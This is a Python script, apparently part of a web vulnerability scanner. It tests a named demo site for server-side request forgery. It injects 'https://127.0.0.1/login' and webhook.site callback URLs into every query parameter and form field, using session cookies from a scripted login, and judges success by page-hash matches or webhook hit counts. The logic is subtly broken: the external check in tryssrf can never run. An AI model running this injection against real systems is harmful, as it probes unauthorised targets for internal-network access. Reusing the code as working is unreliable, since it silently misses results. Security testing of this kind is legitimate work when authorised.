import requests
import json
import hashlib
import time
from seleniumBot import login_get_cookie_jar

def tryssrf(listofgeturlrequests, token1, session_cookie):
    trylist_ext = set()
    trylist_int = set()
    for url in listofgeturlrequests:
        # first, attempt to add in the URL of a webhook.
        querysplit = url.split("?")
        anpersplit = querysplit[1].split("&")
        newlist_ext = []
        newlist_int = []
        for i in anpersplit:
            valusplit = i.split("=")
            # Change the value of the parameter to the webhook website
            querystring = f"{valusplit[0]}={f'https://webhook.site/{token1}'}"
            newlist_ext.append(querystring)
            # Change the value of the parameter to the internal testing website
            querystring = f"{valusplit[0]}={f'https://127.0.0.1/login'}"
            newlist_int.append(querystring)
        addanper_ext = "&".join(newlist_ext)
        addanper_int = "&".join(newlist_int)
        addquery_ext = f"{querysplit[0]}?{addanper_ext}"
        addquery_int = f"{querysplit[0]}?{addanper_int}"
        trylist_ext.add(addquery_ext)  # 1 for testing if it will access internal
        trylist_int.add(
            (url, addquery_int)
        )  # another for testing if it will access external

    # begin testing already
    vulnlist = {"internal": [], "external": []}
    # finding the hash of the login page.
    resp = requests.get(
        "https://chmsdemo.greenfossil.com/login"
    )  # create a request using normal access
    loginhash = hashlib.sha1(resp.text.encode()).hexdigest()

    for i in trylist_int:
        print("Testing if ssrf works to the internal network:", i)
        resp = requests.get(
            i[1], cookies=session_cookie
        )  # create a request using the payload
        hash2 = hashlib.sha1(resp.text.encode()).hexdigest()
        time.sleep(0.5)
        if loginhash == hash2:
            vulnlist["internal"].append(i[0])
    # accessing internal
    if len(vulnlist) == 0:
        count = 0
        for i in trylist_ext:
            print("Testing if ssrf works to the external network:", i)
            requests.get(i, cookies=session_cookie)
            time.sleep(1)
            resp = requests.get(f"https://webhook.site/token/{token1}/requests")
            new_count = json.loads(resp.text)["total"]
            if new_count > count:  # New request detected
                vulnlist["external"].append(i)
            count = new_count
    return vulnlist

def ssrf(baseurl, endpoint, method, params, token1) : # params - input field's id in dict
    site_return_hash = requests.get("https://chmsdemo.greenfossil.com/login")
    site_return_hash = site_return_hash.text
    if endpoint == baseurl + "/authenticate" :
        session_cookie = login_get_cookie_jar(baseurl, params['loginId'], params['password'])
        # response = requests.post(endpoint, data=params)
        # session_cookie = response.cookies
        if session_cookie != -1 :
            cookie_storage.append(session_cookie)
    # internal injecting happens here:
    for key in params.keys() :
        params[key] = 'https://127.0.0.1/login'
    print(f"Payload injected into {endpoint}\n{params}")
    if cookie_storage :
        response = method(endpoint, data=params, cookies=cookie_storage[0]) # )
    else :
        response = method(endpoint, data=params) 
    hashresponse  = response.text
    if hashresponse == site_return_hash:
        print("SSRF injection is successful")
        with open(ssrf_vuln_file, 'a') as file :
            vuln_endpoint = {"Endpoint" : endpoint, "Payload" : 'https://127.0.0.1/login', "direction" : "internal"}
            file.write(json.dumps(vuln_endpoint) + '\n')
    else: # external injection happens here:
        for key in params.keys():
            params[key] = f'https://webhook.site/{token1}'
        print(f"Payload injected into {endpoint}\n{params}")
        # get the old count
        resp = requests.get(f"https://webhook.site/token/{token1}/requests")
        count = json.loads(resp.text)["total"]
        method(endpoint, data=params, cookies=cookie_storage[0]) # )
        resp = requests.get(f"https://webhook.site/token/{token1}/requests")
        new_count = json.loads(resp.text)["total"]
        if new_count > count:
            with open(ssrf_vuln_file, 'a') as file :
                vuln_endpoint = {"Endpoint" : endpoint, "Payload" : f'https://webhook.site/{token1}', "direction" : "external"}
                file.write(json.dumps(vuln_endpoint) + '\n')
    print("Done injecting...")

cookie_storage = []
ssrf_vuln_file = 'injection-results/ssrf_vuln_endpoints.txt'